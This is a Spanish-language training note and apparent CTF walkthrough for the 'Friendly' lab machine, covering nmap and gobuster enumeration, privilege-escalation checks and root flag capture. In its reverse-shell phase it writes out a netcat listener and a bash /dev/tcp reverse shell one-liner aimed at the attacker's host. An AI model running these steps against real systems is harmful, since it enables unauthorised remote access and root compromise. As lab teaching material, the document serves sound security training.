---
title: "🖥️ Máquina: Friendly — Hacking Ético"
aliases:
  - Friendly
  - friendly
  - Máquina Friendly
  - VM Friendly
  - Writeup Friendly
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
  - reverse-shell
  - privesc
---

# 🖥️ Máquina: Friendly

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración Web · Descubrimiento de Endpoints · Reverse Shell · Elevación de Privilegios por Permisos Débiles  
> **Descripción:** Escenario de auditoría introductorio donde se practica el reconocimiento de aplicaciones web sencillas, identificación de vías de inyección o subida para obtener una consola inversa (*reverse shell*), y posterior auditoría de permisos de ficheros o utilidades locales para elevar privilegios a root.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / Friendly):** Ej. `10.0.0.12`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Friendly tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de Servicios y Puertos

```bash
nmap -sT -p- $RHOST
nmap -A -p21,80 $RHOST
```

> [!info] Resultado
> Descubrimiento de los puertos abiertos, servicios expuestos y versiones del servidor web y servicios auxiliares.

---

## 🌐 Fase 2: Enumeración Web y Descubrimiento

```bash
gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

> [!info] Resultado
> Identificación de rutas accesibles, formularios o paneles donde poder interactuar con el servidor web.

---

## 🐚 Fase 3: Acceso Inicial (Reverse Shell)

1. En Kali Linux, preparamos un oyente con Netcat en el puerto deseado:
   ```bash
   nc -lvnp 4444
   ```

2. Enviamos la carga útil para establecer conexión interactiva:
   ```bash
   bash -i >& /dev/tcp/$LHOST/4444 0>&1
   ```

3. Tras recibir la shell, estabilizamos la consola interactiva:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```

---

## 🚀 Fase 4: Auditoría Local y Escalada a Root

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
```

> [!info] Resultado
> Búsqueda de configuraciones permisivas en `/etc/sudoers` o binarios SUID que permitan invocar un intérprete de comandos con privilegios de superusuario (`#` root).

Una vez elevados privilegios, capturamos la bandera de root:
```bash
cat /root/root.txt
```

---

> [!note] 📝 Nota Oficial sobre la Plataforma
> En el servidor oficial de `cursosmfr.es`, la plantilla web de esta máquina se encontraba temporalmente en blanco (0 bytes). Se mantiene documentado el flujo metodológico para completar el laboratorio con la máquina homóloga de VulnHub (*Friendly: 1*).

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
